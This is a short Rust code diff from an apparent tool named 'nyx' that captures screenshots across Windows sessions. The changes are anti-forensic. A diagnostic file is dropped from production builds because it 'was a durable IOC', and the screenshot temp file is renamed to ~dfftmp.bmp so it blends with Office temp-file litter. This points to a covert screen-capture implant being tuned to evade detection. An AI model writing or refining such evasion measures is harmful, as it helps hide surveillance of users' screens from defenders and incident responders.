@@ -834,10 +834,14 @@ unsafe fn write_all_to_file(path: &[u8], data: &[u8]) -> bool {
 }
 
 /// TEMP diagnostic for the 200%-RDP-session virtualized-crop investigation:
-/// logs (to C:\Windows\Temp\nyx_dpi_diag.txt) whether the thread-PMv2 call
-/// resolves/succeeds and the virtual-screen metrics BEFORE/AFTER it, from
-/// inside the helper process. Called by `nyx_screenshot_session`. Remove once
-/// the crop issue is closed out.
+/// logs (to a file under %TEMP%) whether the thread-PMv2 call resolves/succeeds
+/// and the virtual-screen metrics BEFORE/AFTER it, from inside the helper
+/// process. The DPI crop bug was root-caused and fixed via the CreateDIBSection
+/// migration (see `capture_bmp`); this probe is retained as a debug aid for
+/// future DPI regressions but is compiled OUT of production builds — writing
+/// a fixed-name diagnostic file to disk on every screenshot was a durable IOC.
+/// Built only under `--features selftest`.
+#[cfg(feature = "selftest")]
 pub unsafe fn dpi_probe_diag() {
     let mut s: Vec<u8> = Vec::new();
     fn num(s: &mut Vec<u8>, v: i64) {
@@ -973,7 +977,12 @@ fn format_err(c: u8) -> String {
     s
 }
 
-const SHOT_TEMP: &[u8] = b"C:\\Windows\\Temp\\nyx_shot.bmp\0";
+/// Cross-session handoff path. MUST match the path `entry::nyx_screenshot_session`
+/// writes — both use `C:\Windows\Temp\~dfftmp.bmp`. The filename blends with the
+/// `~DfXXXX.tmp` litter Office/filter drivers leave under %TEMP%, and the file
+/// is deleted by `cross_session_capture` once read back. The old fixed
+/// `nyx_shot.bmp` name was a durable IOC.
+const SHOT_TEMP: &[u8] = b"C:\\Windows\\Temp\\~dfftmp.bmp\0";
 
 unsafe fn cross_session_capture() -> Option<Vec<u8>> {
     // Default step code = "an export could not be resolved" (8). The explicit
